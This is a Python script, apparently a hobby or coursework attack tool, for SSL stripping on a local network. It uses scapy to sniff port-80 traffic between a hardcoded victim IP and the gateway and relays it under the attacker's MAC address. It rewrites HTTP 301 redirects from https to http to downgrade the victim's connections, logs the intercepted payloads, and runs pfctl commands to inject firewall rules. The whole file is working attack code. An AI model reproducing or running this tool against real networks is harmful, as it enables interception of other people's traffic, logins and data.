#!/usr/bin/env python3

import socket
import threading
import re
import ssl
import urllib.parse
from datetime import datetime
from scapy.all import sniff, TCP, IP, get_if_hwaddr, get_if_addr, Ether, sendp, srp, ARP, Raw
import sys
import signal
import os

class SSLStripper:
    def __init__(self, interface, target_ip, gateway_ip) -> None:
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing = False
        self.forwarded_packets = set()  # Track packets we've forwarded
        self.blocked_tcp = set()

        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)

        # Get MAC addresses with unlimited retries
        while True:
            self.target_mac = self.get_mac(target_ip)
            self.gateway_mac = self.get_mac(gateway_ip)

            if self.target_mac and self.gateway_mac and self.target_mac != self.attacker_mac and self.gateway_mac != self.attacker_mac:
                break

            print("[!] Retrying to get MAC addresses...")

        # Set up signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)


        #Set up system
        self.system_restart()

    
    def system_restart(self):
        """Set up system for SSL stripping using pfctl"""
        try:            
            # Enable and load pf rules
            os.system('pfctl -e')  # Enable pf
            os.system('pfctl -f /etc/pf.conf')  # Load rules
            
            print("[*] PF rules configured successfully")
        except Exception as e:
            print(f"[!] Error setting up PF rules: {e}")
            self.stop()

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C signal"""
        print("\n[!] Interrupted by user.")
        self.stop()

    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print(f"[!] Could not get MAC address for {ip}")
            return None

    def start(self):
        self.spoofing = True
        print("[*] Starting SSL stripping...")
        print(f"[*] Target IP: {self.target_ip} (MAC: {self.target_mac})")
        print(f"[*] Gateway IP: {self.gateway_ip} (MAC: {self.gateway_mac})")

        try:
            while self.spoofing:
                # print("[*] Sniffing for HTTP traffic...")
                sniff(filter=f"tcp port 80",
                      prn=self.handle_packet,
                      iface=self.interface,
                      stop_filter=lambda p: not self.spoofing,
                      timeout=1)
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop()

    def stop(self):
        print("[*] Stopping SSL stripping...")
        self.spoofing = False
        self.system_restart()
    
    def is_tcp(self, packet):
        if not packet.haslayer(TCP):
            return False
        flags = str(packet[TCP].flags)
        return flags == 'S'
    
    def get_tcp(self, packet):
        return (packet[IP].src, packet[TCP].sport, packet[IP].dst, packet[TCP].dport)


    def handle_packet(self, packet):
        if not packet.haslayer(TCP) or not packet.haslayer(IP):
            return

        if self.is_tcp(packet) and self.get_tcp(packet) not in self.blocked_tcp:
            # block drop quick on en0 proto tcp from 192.168.0.186 to any port 80
            # block drop quick on en0 proto tcp from 192.0.43.8 to any port 50000
            # Extract source and destination IPs
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Extract source and destination ports
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            
            # Set firewall rules to block traffic
            os.system(f"pfctl -e")  # Enable pf firewall
            os.system(f"pfctl -f /etc/pf.conf")  # Load default rules
            os.system(f"echo 'block drop quick on {self.interface} proto tcp from {src_ip} to any port {dst_port}' | pfctl -f -")
            os.system(f"echo 'block drop quick on {self.interface} proto tcp from {dst_ip} to any port {src_port}' | pfctl -f -")

            self.blocked_tcp.add(self.get_tcp(packet))

        # Create a unique identifier for this packet
        packet_id = (packet[IP].id, packet[TCP].seq)

        # Skip if we've already forwarded this packet
        if packet_id in self.forwarded_packets:
            self.forwarded_packets.remove(packet_id)
            return

        # Check if packet is from target to gateway or vice versa
        if (packet[IP].src == self.target_ip) or (packet[IP].dst == self.target_ip):

            # Create a new packet to forward
            new_packet = packet.copy()
            if packet[IP].src == self.target_ip:
                new_packet[Ether].src = self.attacker_mac
                new_packet[Ether].dst = self.gateway_mac
            else:
                new_packet[Ether].src = self.attacker_mac
                new_packet[Ether].dst = self.target_mac
            # Add payload if it exists
            if new_packet.haslayer(Raw):
                raw_payload = new_packet[Raw].load
                try:
                    raw_payload = raw_payload.decode('utf-8', errors='ignore')
                    # Check for HTTP 301 and Location header
                    if 'HTTP/1.1 301 Moved Permanently' in raw_payload.splitlines()[0]:
                        # Replace https with http in Location header
                        new_payload = re.sub(
                            r'https://[^\r\n]+',
                            lambda m: m.group(0).replace('https://', 'http://') + ' ',
                            raw_payload
                        )
                        new_packet[Raw] = Raw(load=new_payload.encode())
                        print("[*] Modified 301 Location header (https -> http)")
                    print(f"[*] Payload: {raw_payload}...")
                except Exception as e:
                    print("[*] Binary payload", e)
                    new_packet[Raw] = Raw(load=raw_payload)

            # Mark this packet as forwarded
            self.forwarded_packets.add(packet_id)

            # Recalculate checksums for IP and TCP layers
            del new_packet[IP].chksum
            del new_packet[TCP].chksum
            new_packet[IP].chksum = None
            new_packet[TCP].chksum = None

            if Raw in new_packet:
                print(f"[*] Forwarding packet with payload: {new_packet[Raw].load.decode('utf-8', errors='ignore')}")

            sendp(new_packet, iface=self.interface, verbose=False)
            return


if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.186"  # Change this to your target's IP
    gateway_ip = "192.168.0.1"  # Change this to your gateway's IP

    spoofer = SSLStripper(interface, target_ip, gateway_ip)
    spoofer.start()

# TODO: auto set rule